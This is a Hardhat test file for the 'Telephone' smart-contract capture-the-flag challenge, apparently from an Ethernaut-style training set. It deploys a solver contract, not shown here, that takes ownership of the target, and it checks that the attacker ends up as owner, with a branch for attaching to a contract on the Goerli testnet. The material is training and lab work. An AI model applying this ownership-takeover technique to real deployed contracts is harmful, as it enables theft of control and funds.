const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Telephone', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Telephone');
            this.target = ContractFactory.attach("");
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Telephone', deployer);
            this.target = await ContractFactory.deploy();
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        const TelephoneSolverFactory = await ethers.getContractFactory('TelephoneSolver', attacker);
        const TelephoneSolver = await TelephoneSolverFactory.deploy();
        let changeTX = await TelephoneSolver.callChangeOwner(this.target.address);
        await changeTX.wait();
        console.log(`\t owner   : ${await this.target.owner()}`);
        console.log(`\t attacker: ${attacker.address}`);
    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(await this.target.owner()).to.be.eq(attacker.address);
    });
});